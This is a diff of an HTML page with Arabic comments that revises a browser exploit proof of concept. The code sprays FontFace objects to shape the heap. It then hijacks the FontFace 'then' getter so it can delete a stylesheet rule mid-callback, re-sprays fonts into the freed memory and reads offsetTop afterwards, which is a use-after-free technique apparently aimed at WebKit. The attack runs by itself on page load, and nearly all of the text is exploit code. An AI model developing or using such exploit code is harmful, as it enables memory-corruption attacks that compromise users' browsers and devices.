@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>محاكاة البنية التاريخية المستقرة</title>
+    <title>تفكيك جمود المكدس - المسار الصحيح</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
         #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
@@ -16,8 +16,8 @@
 </head>
 <body>
 
-    <h2>محاكاة تنظيم الـ Heap (Structured Font Spray)</h2>
-    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار مهلة الاستقرار...</div>
+    <h2>مراقبة التداخل المستقر والتدوير الداخلي</h2>
+    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المتصفح...</div>
 
     <script>
         const consoleElement = document.getElementById('custom-console');
@@ -30,48 +30,46 @@
         }
 
         var bad_fonts = [];
-        var SPRAY_FONTS = 1500; // الحجم المتوافق لمنع OOM التحديث
 
         function startExploitAnalysis() {
             consoleElement.innerHTML = ""; 
-            screenLog("بدء تنظيم الذاكرة (Heap Packing)...");
+            screenLog("بدء تشغيل الفحص المستقر...");
 
             try {
-                // 1. الإغراق البدئي كما هو في ملف webkit.js الأصلي
-                for (var i = 0; i < SPRAY_FONTS; i++) {
-                    bad_fonts.push(new FontFace("font1", "", {}));
-                }
-                screenLog(`تم حقن ${SPRAY_FONTS} كائن خط لتشكيل الـ Heap.`);
-
+                // إعداد الكائن الأساسي أوالاً دون حشو مسبق لمنع تجميد المحرك
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                bad_fonts.push(A);
+                document.fonts.add(A);
                 void A.loaded;
 
                 let fired = false;
 
-                // 2. كمين التداخل المستقر
+                // كمين المقاطعة
                 Object.defineProperty(FontFace.prototype, 'then', {
                     configurable: true,
                     get() {
                         if (!fired && this === A) {
                             fired = true;
-                            screenLog("!! تم رصد التداخل المنطقي المستقر !!", true);
+                            screenLog("!! تم تفعيل الكمين المنطقي بنجاح !!", true);
                             
+                            // الحذف الفوري للقاعدة داخل المقاطعة
                             try {
                                 document.getElementById('s').sheet.deleteRule(0);
                                 screenLog("تم حذف القاعدة بنجاح.");
                             } catch(e) { screenLog("خطأ الحذف: " + e.message, true); }
                             
-                            // إغراق تعويضي سريع بعد الحذف
-                            for (var i = 0; i < 200; i++) {
-                                bad_fonts.push(new FontFace("font2", "", {}));
+                            // الآن نقوم بعمل الإغراق الداخلي المستهدف لملء الفراغ برمجياً
+                            screenLog("جاري حجز كائنات الخطوط البديلة داخل الـ Getter...");
+                            for (var i = 0; i < 400; i++) {
+                                bad_fonts.push(new FontFace("font_spray", "", {}));
                             }
+                            screenLog("اكتمل حجز الكائنات البديلة.");
 
+                            // طلب القراءة المؤجلة لكسر الـ Pinning
                             setTimeout(() => {
-                                screenLog("قراءة الـ Offset المؤجلة...");
+                                screenLog("محاولة القراءة المؤجلة (offsetTop)...");
                                 let offset = document.body.offsetTop;
                                 screenLog("قيمة الـ Offset المسترجعة: " + offset);
-                            }, 20);
+                            }, 25);
                         }
                         
                         return function(resolve) { if (resolve) resolve(); };
@@ -86,8 +84,9 @@
             }
         }
 
+        // الانتظار الآمن لتجنب OOM الدخول الأول
         window.onload = () => {
-            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية لتأمين الدخول الأول...");
+            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية لتأمين البيئة...");
             setTimeout(startExploitAnalysis, 1500);
         };
     </script>
